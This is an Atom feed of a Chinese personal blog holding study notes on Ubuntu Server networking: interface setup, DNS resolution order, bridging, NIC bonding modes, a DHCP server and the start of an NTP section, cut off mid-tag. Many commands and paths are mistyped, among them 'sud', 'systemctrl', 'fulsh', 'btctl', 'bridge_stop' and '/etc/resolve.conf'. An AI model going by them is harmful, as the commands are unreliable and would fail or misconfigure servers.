<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偷得浮生半日闲</title>
  
  <subtitle>再偷浮生两吊钱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.xpshuai.cn/"/>
  <updated>2020-03-08T09:56:33.062Z</updated>
  <id>http://www.xpshuai.cn/</id>
  
  <author>
    <name>浮生</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ubuntu server-网络相关知识</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
    <id>http://www.xpshuai.cn/ubuntu server-网络相关知识/</id>
    <published>2020-03-08T09:48:37.000Z</published>
    <updated>2020-03-08T09:56:33.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络原理"><a href="#网络原理" class="headerlink" title="网络原理"></a>网络原理</h2><p><img src="/ubuntu server-网络相关知识/20200214100233476_240785919.png"></p><p><code>ping 127.0.0.1</code> 如果能通，说明本机的TCP/IP协议已经配置成功啦<br><code>arping</code></p><h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><h6 id="网卡接口"><a href="#网卡接口" class="headerlink" title="网卡接口"></a>网卡接口</h6><p>-enp2s0 (最近使用)、eth0   （以前这么使用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#wl 开头的是无线网卡</span><br><span class="line"></span><br><span class="line"># ifconfig 命令</span><br><span class="line"># 查看所有网卡</span><br><span class="line">ifconfig -a</span><br><span class="line">    字段意义：MTU,发包，收包，`collisions`发生多少次冲突</span><br><span class="line"></span><br><span class="line"># ip 命令</span><br><span class="line"> ip link     # 查看所有网卡和信息</span><br><span class="line"> ip address</span><br><span class="line"></span><br><span class="line"># lshw   查看系统硬件命令</span><br><span class="line"># 只查看网卡的命令</span><br><span class="line">sudo lshw -class network</span><br></pre></td></tr></table></figure><h6 id="管理网卡"><a href="#管理网卡" class="headerlink" title="管理网卡"></a>管理网卡</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看网卡参数</span></span><br><span class="line">sud ethtool enp0s3</span><br><span class="line"></span><br><span class="line"><span class="comment"># -s   配置 ： speed 速度 半双工 </span></span><br><span class="line">sud ethtool -s duplex half | full speed 1000</span><br></pre></td></tr></table></figure><h6 id="网络基本设置"><a href="#网络基本设置" class="headerlink" title="网络基本设置"></a>网络基本设置</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 临时设置IP地址</span></span><br><span class="line">sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0</span><br><span class="line"><span class="comment"># 24位掩码</span></span><br><span class="line">sudo ifconfig eth0 10.0.0.100/24</span><br><span class="line"><span class="comment"># 设置网关 gw</span></span><br><span class="line">sudo route add default gw 10.0.0.1 eth0</span><br><span class="line"><span class="comment"># 网段路由 add-net   （静态路由：去哪个网段，应该怎么转发）</span></span><br><span class="line">sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1</span><br><span class="line"><span class="comment"># 主机路由 add-host    </span></span><br><span class="line">sudo route add-host 2.2.2.2 gw 1.1.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除网卡配置</span></span><br><span class="line">ip addr fulsh eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向网络中要一个IP</span></span><br><span class="line">sudo dhcpclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用网卡</span></span><br><span class="line">sudo ifconfig eth0 down</span><br><span class="line"><span class="comment"># 启用网卡</span></span><br><span class="line">sudo ifconfig eth0 up</span><br><span class="line"><span class="comment"># 重启网络服务</span></span><br><span class="line">sudo systemctrl restart networking.service</span><br></pre></td></tr></table></figure><h6 id="网卡配置文件"><a href="#网卡配置文件" class="headerlink" title="网卡配置文件"></a>网卡配置文件</h6><p><code>/etc/nwtwork/interfaces</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文件字段：</span><br><span class="line">iface 网卡name inet 网络配置（loopback/dhcp/static）</span><br><span class="line"></span><br><span class="line">    sudo eth0</span><br><span class="line">    iface eth0 inet static|DHCP</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pre-up 系统启动中(网卡运行前)  设置为1000M，全双工</span></span><br><span class="line">    pre-up/sbin/ethtool -s eth0 speed 1000 duplex full</span><br></pre></td></tr></table></figure></p><h6 id="动态获取IP地址"><a href="#动态获取IP地址" class="headerlink" title="动态获取IP地址"></a>动态获取IP地址</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0</span><br><span class="line">iface inet dhcp</span><br></pre></td></tr></table></figure><h6 id="静态IP地址"><a href="#静态IP地址" class="headerlink" title="静态IP地址"></a>静态IP地址</h6><p>一般服务器是静态的IP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0</span><br><span class="line">iface inet static</span><br><span class="line">    address 192.168.123.9</span><br><span class="line">    netmask 255.255.255.0        <span class="comment"># 掩码</span></span><br><span class="line">    gateway 192.168.123.1        <span class="comment"># 网关</span></span><br><span class="line">    dns-nameservers 192.168.123.1 202.99.96.68   <span class="comment"># 一般dns地址写俩</span></span><br><span class="line">    <span class="comment"># 上面是基本配置, 下面是额外其他配置项</span></span><br><span class="line">    broadcast 192.168.123.255   <span class="comment"># 网段的广播地址</span></span><br><span class="line">    <span class="comment"># dns-search  abc.com  # 如果属于某个dns域,就默认去找这个</span></span><br><span class="line">    up route add -net 172.16.0.0/24  gw 192.168.23.1 eth0   <span class="comment"># 开机之后,添加一个网段(要指定具体网关)</span></span><br><span class="line">    mtu 1460   <span class="comment"># 指定MTU 字节</span></span><br><span class="line">    <span class="comment"># hwaddress 00:11:22:33:44:55   # 指定硬件mac地址</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机)</span></span><br><span class="line">sudo ip address fulsh eth0 </span><br><span class="line">sudo systemctrl restart networking.service</span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-网络相关知识/20200214114820323_1273216811.png"><br>指定路由<br>清除信息<br>ip addr flush ens32</p><blockquote><p>Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制)</p></blockquote><h2 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h2><h6 id="DNS配置文件"><a href="#DNS配置文件" class="headerlink" title="DNS配置文件"></a>DNS配置文件</h6><p><code>/etc/resolve.conf</code>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/resolve.conf    <span class="comment"># DNS设置（软连接）</span></span><br><span class="line">格式:</span><br><span class="line">    nameserver 114.114.114.114</span><br><span class="line">    nameserver 127.0.0.53</span><br><span class="line">    options edns0</span><br><span class="line">    search www.tendawifi.com</span><br></pre></td></tr></table></figure><h6 id="主机名解析"><a href="#主机名解析" class="headerlink" title="主机名解析"></a>主机名解析</h6><p>1.配置文件 <code>/etc/hosts</code>    优先级别<code>高</code>于resolve.conf里面的dns服务器的信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip 和名称做解析</span></span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">192.168.0.111 www.qq.com</span><br><span class="line"><span class="comment"># 现在这里找映射，有的话就不去resolve里面找了</span></span><br></pre></td></tr></table></figure></p><p>2.配置文件 <code>/etc/nsswitch.conf</code>        名称解析顺序配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照优先级先后排序来解析  （前面的不满足，才调用后面的）</span></span><br><span class="line">- files        /etc/hosts</span><br><span class="line">- Resolve        全称systemd-resolved.service(缓存、localhost、本机名)   （默认安装）</span><br><span class="line">- [NOTFOUND=<span class="built_in">return</span>]        结果即权威  （正则表达式）  （当找不给我到的之后，返回）</span><br><span class="line">- dns                    dns服务器（resolve文件配置的那些）</span><br><span class="line">- mdns4_minimal            MulticastDNS(多播dns服务)     现在很多dns厂家用的就是多播dns服务</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">hosts:          files mdns4_minimal [NOTFOUND=<span class="built_in">return</span>] dns myhostname</span><br></pre></td></tr></table></figure></p><blockquote><p>关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了</p></blockquote><h6 id="查看路由"><a href="#查看路由" class="headerlink" title="查看路由"></a>查看路由</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 路由信息</span></span><br><span class="line">route -n</span><br><span class="line"></span><br><span class="line">netstat -nr</span><br></pre></td></tr></table></figure><h2 id="网桥配置"><a href="#网桥配置" class="headerlink" title="网桥配置"></a>网桥配置</h2><blockquote><p>把服务器当交换机用实在是大材小用<br>把多个以太网段以上层透明的方式连接在一起</p></blockquote><p><strong>应用场景：</strong><br>1.可做防火墙<br>2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候）<br>3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP）<br>4.链路荣誉容错（需启用STP）<br>5.通过网桥管理工具实现 <code>bridge-utils</code></p><p><img src="/ubuntu server-网络相关知识/20200218132001375_1018333933.png"></p><h6 id="在ubunut搭建网桥"><a href="#在ubunut搭建网桥" class="headerlink" title="在ubunut搭建网桥"></a>在ubunut搭建网桥</h6><p>在虚拟机添加2块网卡(一块NAT，另一块随便)</p><p><strong>安装网桥管理包：</strong><br><code>sudo apt install bridge-utils</code></p><p><strong>临时配置网桥：</strong><br>命令： <code>btctl</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo btctl addr br0     <span class="comment"># 添加一个网桥的网卡接口</span></span><br><span class="line">sudo btctl addif br0 eth0 eth1  <span class="comment"># 往网桥接口添加2块网卡</span></span><br><span class="line"><span class="comment"># sudo ifconfig eth0 down   # 把网卡down掉</span></span><br><span class="line">sudo ifconfig eth0 0.0.0.0 up    <span class="comment"># 2者的ip变没了</span></span><br><span class="line">sudo ifconfig eth1 0.0.0.0 up</span><br><span class="line">sudo ifconfig br0 1.1.1.1/24 up   <span class="comment"># 手动配置网桥网卡的ip并up</span></span><br><span class="line">sudo dhclient br0    <span class="comment"># 或者 dhcp自动获取网桥网卡的ip地址</span></span><br><span class="line">sudo route add default gw 1.1.1.10    <span class="comment"># 添加一个网关，就可以访问外网了</span></span><br></pre></td></tr></table></figure></p><p><strong>持久配置网桥：</strong><br>修改配置文件： <code>/etc/network/interfaces</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet manual</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp   <span class="comment"># dncp  ， 也可以static，下面手动配置address，netmask和gateway</span></span><br><span class="line">bridge_ports eth0 eth1  <span class="comment"># 加入网卡</span></span><br><span class="line">bridge_stop off   <span class="comment">#关闭生成树 ,也可以 on开启成树，参与生成树计算</span></span><br></pre></td></tr></table></figure></p><p>修改保存，然后 重启网络服务/重启服务器</p><p><strong>查看网桥运行状态</strong><br><code>sudo brctl show</code><br><strong>查看mac情况</strong><br><code>sudo brctl showmacs br0</code><br><strong>查看生成树情况</strong><br><code>sudo brctl showstp br0</code></p><h2 id="网卡绑定-经常使用"><a href="#网卡绑定-经常使用" class="headerlink" title="网卡绑定   (经常使用)"></a>网卡绑定   (经常使用)</h2><blockquote><p>还记得小时候这段一把筷子的故事吗</p></blockquote><p>实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力</p><h6 id="一些常用称呼："><a href="#一些常用称呼：" class="headerlink" title="一些常用称呼："></a>一些常用称呼：</h6><p>Bonding == Port Trunking == Link aggregation(链路聚合)  == Team</p><h6 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h6><p>将多个物理网卡组合为一个逻辑网卡</p><ul><li>高可用、负载平衡、高吞吐量</li></ul><h4 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h4><p>在虚拟机做实验：先给虚拟机添加至少两块网卡<br>1.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> bonding &gt;&gt; /etc/modules        <span class="comment"># 添加内核支持</span></span><br><span class="line">sudo modprobe bonding       <span class="comment"># 手动加载内核(临时)， modeprobe加载bonding</span></span><br><span class="line">ifconfig -a    <span class="comment"># 可以看到自动生成了一个bonding0的网卡(但是没有up)</span></span><br><span class="line">sudo systemctl stop networking     </span><br><span class="line"><span class="comment"># 永久配置，文件</span></span><br><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">bounding    <span class="comment"># 添加一个模块</span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart networking</span><br></pre></td></tr></table></figure></p><p>2.配置网卡配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Mode 1 配置</span><br><span class="line"># sudo vim /etc/network/interfaces</span><br><span class="line">auto eth0 </span><br><span class="line">iface eth0 inet manual</span><br><span class="line">bond-master  bond0    # 绑定到哪个bound上</span><br><span class="line">bond-primary  eth0    # 默认做的主的网卡</span><br><span class="line"></span><br><span class="line">auto eth01</span><br><span class="line">iface eth01 inet manual</span><br><span class="line">bond-master  bond0      # 备的网卡，协商要绑定那个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto bond0</span><br><span class="line">iface bond0 inet dhcp   # 让ip地址dhcp； 或者static 手动制定</span><br><span class="line">bond-mode   1    # 绑定模式   active-backup</span><br><span class="line">bond-miimon 100    # 故障检测间隔： 100ms</span><br><span class="line">bond-slaves none         # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line"># 重启服务</span><br><span class="line">sudo systemctl restart networking</span><br></pre></td></tr></table></figure></p><p>PS: 绑定模式<br>bound-mode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1     一个主，一个备(主的故障后才工作)  也叫： active-backup</span><br></pre></td></tr></table></figure></p><h4 id="6种模式"><a href="#6种模式" class="headerlink" title="6种模式"></a>6种模式</h4><h6 id="Mode-0-：-round-robin-轮询"><a href="#Mode-0-：-round-robin-轮询" class="headerlink" title="Mode 0  ： round-robin(轮询)"></a>Mode 0  ： round-robin(轮询)</h6><ul><li>网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据）</li><li>高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽）</li></ul><h6 id="Mode-1-ative-backup"><a href="#Mode-1-ative-backup" class="headerlink" title="Mode 1 : ative-backup"></a>Mode 1 : ative-backup</h6><ul><li>Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高）</li><li>对外只有一个网卡的MAC地址可见</li><li>高可用<br>实现不了负载均衡，有多个接口也没用</li></ul><h6 id="Mode-2-balance-XOR"><a href="#Mode-2-balance-XOR" class="headerlink" title="Mode 2:  balance-XOR"></a>Mode 2:  balance-XOR</h6><ul><li>根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0）</li><li>高可用，负载均衡</li></ul><p>（XOR — &gt; 异或）<br>只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡<br>流量不是平均的</p><h6 id="Mode-3-broadcast"><a href="#Mode-3-broadcast" class="headerlink" title="Mode 3   broadcast"></a>Mode 3   broadcast</h6><ul><li>发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断</li><li>高可用</li></ul><h6 id="Mode-4-802-3ad（Dynamic-link-aggregation）"><a href="#Mode-4-802-3ad（Dynamic-link-aggregation）" class="headerlink" title="Mode 4   802.3ad（Dynamic link aggregation）"></a>Mode 4   802.3ad（Dynamic link aggregation）</h6><ul><li>链路聚合LACP组内的网卡使用相同速率、双工设置</li><li>要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置</li><li>高可用、负载均衡</li></ul><h6 id="Mode-5-balance-tlb-（Adaptive-transmit-load-balancing）"><a href="#Mode-5-balance-tlb-（Adaptive-transmit-load-balancing）" class="headerlink" title="Mode 5    balance-tlb （Adaptive transmit load balancing）"></a>Mode 5    balance-tlb （Adaptive transmit load balancing）</h6><ul><li>隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡</li><li>高可用、负载均衡</li></ul><h6 id="Mode-6-balance-alb-Adaptive-load-balance"><a href="#Mode-6-balance-alb-Adaptive-load-balance" class="headerlink" title="Mode 6:   balance-alb (Adaptive load balance)"></a>Mode 6:   balance-alb (Adaptive load balance)</h6><ul><li>Mode 5 + balance-rlb (入站流量负载均衡)<ul><li>Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC</li><li>不同的对端使用不同的服务器MAC地址，实现入站负载均衡<ul><li>不需要上连交换机额外配置</li></ul></li></ul></li></ul><h6 id="查看bond端口和状态"><a href="#查看bond端口和状态" class="headerlink" title="查看bond端口和状态"></a>查看bond端口和状态</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/net/bonding/bond0</span><br></pre></td></tr></table></figure><h6 id="Model-4-配置"><a href="#Model-4-配置" class="headerlink" title="Model 4 配置"></a>Model 4 配置</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/network/interfaces</span></span><br><span class="line">auto eth0     <span class="comment"># 其他物理网卡配置项同</span></span><br><span class="line">iface eth0 inet manual</span><br><span class="line">bond-master  boud0    <span class="comment"># 绑定到哪个bound上</span></span><br><span class="line"></span><br><span class="line">auto bon</span><br><span class="line">d0</span><br><span class="line">iface bond0 inet dhcp   <span class="comment"># 让ip地址dhcp； 或者static 手动制定</span></span><br><span class="line">bond-mode 4    <span class="comment"># 绑定模式   active-backup</span></span><br><span class="line">bond-miimon 100    <span class="comment"># 故障检测间隔： 100ms</span></span><br><span class="line">bond-lacp-rate 1         <span class="comment"># 每1s发送LACPDU（默认为0，即30s）</span></span><br><span class="line">bond-slaves eth0 eth1         <span class="comment"># 指定作为的的成员的网卡</span></span><br></pre></td></tr></table></figure><h2 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h2><p>通常给客户端自动分配IP地址</p><h6 id="Dynamic-Host-Configuration-Protocol"><a href="#Dynamic-Host-Configuration-Protocol" class="headerlink" title="Dynamic Host Configuration Protocol"></a>Dynamic Host Configuration Protocol</h6><ul><li>透明的配置网络参数</li><li>IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个)</li><li>通过地址租约循环使用IP地址（有租约期，循环利用）</li><li>基于UDP， 标准使用 端口： 67(服务端)，68(客户端)</li></ul><p>ps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务</p><p><strong>请求和分配步骤：</strong><br>1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：<code>dhcp discover</code><br>2.dhcp服务器回复数据包<code>dhcp offer</code><br>3.客户端就再发一个广播包<code>dhcp request</code><br>4.服务器端发送数据包<code>ack</code>， 包含ip等参数，标记这个ip为已分配</p><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat，<br>让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件<code>/etc/network/inertface</code>到vmnet8的网段，<code>sudo ip addr fulsh eth0</code>清除原来配置，重启网络服务</p><p>2.安装dhcp服务的软件包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里用的isc的</span></span><br><span class="line">sudo apt install isc-dhcp-server</span><br></pre></td></tr></table></figure></p><p>3.配置dhcp服务</p><blockquote><p>Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##1.先修改配置文件1</span></span><br><span class="line"><span class="comment">#sudo vim /etc/default/isc-dhcp-server   # 指定启动DHCP服务的网卡</span></span><br><span class="line">    INTERFACE=<span class="string">"eth0"</span>   <span class="comment"># 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开）</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">##2.再修改主配置文件（指定地址池和选项） </span></span><br><span class="line"><span class="comment">#sudo vim /etc/dhcp/dhcpd.conf       </span></span><br><span class="line"><span class="comment">#option只对dhcp的作用域起效；其他的很对整个服务器起效</span></span><br><span class="line"><span class="comment">#一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置</span></span><br><span class="line">default-lease-time 600;  <span class="comment">#租约期限， 单位：s</span></span><br><span class="line">max-lease-time 7200;  <span class="comment">#最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取)</span></span><br><span class="line">authoritative;   <span class="comment">#启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了）</span></span><br><span class="line"><span class="comment">#配置地址池(可以手动写，也可以在原注释的基础上配置) 网段</span></span><br><span class="line">subnet 10.1.8.0 netmask 255.255.255.0 &#123;</span><br><span class="line">    range 10.1.8.100 10.1.8.200;   <span class="comment">#可分配的地址段</span></span><br><span class="line">    option routers 10.1.8.1;  <span class="comment">#网关地址</span></span><br><span class="line">    option domain-name-servers 192.168.1.1,192.168.1.2;  <span class="comment">#dns服务器地址，多个用逗号隔开; 一般配到这里就够了</span></span><br><span class="line">    option ntp-server 1.1.1.1;     <span class="comment">#时间服务器</span></span><br><span class="line">    option domain-name <span class="string">"local.lan"</span>;   <span class="comment">#统一的域名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##3.重启服务</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端一些操作</span></span><br><span class="line">ipconfig /all</span><br><span class="line">ipconfig /release   <span class="comment"># 释放这个ip</span></span><br><span class="line">ipconfig /renew    <span class="comment">#重新获取ip</span></span><br></pre></td></tr></table></figure></p></blockquote><p>3.特殊情况(指定某个ip只分配给某台计算机，IP保留)</p><blockquote><p>通过MAC地址来识别<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo vim /etc/dhcp/dhcpd.conf       </span></span><br><span class="line"></span><br><span class="line">host yourname &#123;</span><br><span class="line">    hardware ethernet 00:11:22:33:44:55;</span><br><span class="line">    fixed-address 10.1.8.8;   <span class="comment">#尽量用上面地址池以外的地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#保存，重启</span></span><br></pre></td></tr></table></figure></p></blockquote><h6 id="日常的维护"><a href="#日常的维护" class="headerlink" title="日常的维护"></a>日常的维护</h6><p>日志与状态查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#服务器地址租约结果（可查看分发详细信息）</span></span><br><span class="line">cat /var/lib/dhcp/dhcpd.leases</span><br><span class="line"><span class="comment">#系统日志文件(客户端直接关机不会记录，release的时候会记录)</span></span><br><span class="line">tail -f /var/<span class="built_in">log</span>/syslog</span><br><span class="line"><span class="comment">#查看服务运行状态</span></span><br><span class="line">systemctl status isc-dhcp-server.service</span><br><span class="line"><span class="comment">#客户端来查看获得地址历史(客户端是Linux时)</span></span><br><span class="line">less /var/lib/dhcp/dhcpd.leases</span><br></pre></td></tr></table></figure></p><h2 id="NTP服务-（网络时间协议）"><a href="#NTP服务-（网络时间协议）" class="headerlink" title="NTP服务 （网络时间协议）"></a>NTP服务 （网络时间协议）</h2><blockquote><p>时间都去哪了</p></blockquote><p><img src="/ubuntu server-网络相关知识/20200308150835487_32007.png"></p><p><strong>时间表准：</strong></p><ul><li>GMT：格林威治标准时间</li><li>UTC：世界协调时间</li><li>CST：China Standard Time UT+8:00</li></ul><p><img src="/ubuntu server-网络相关知识/20200308153026228_153.png"></p><h4 id="NTP协议"><a href="#NTP协议" class="headerlink" title="NTP协议"></a>NTP协议</h4><p><img src="/ubuntu 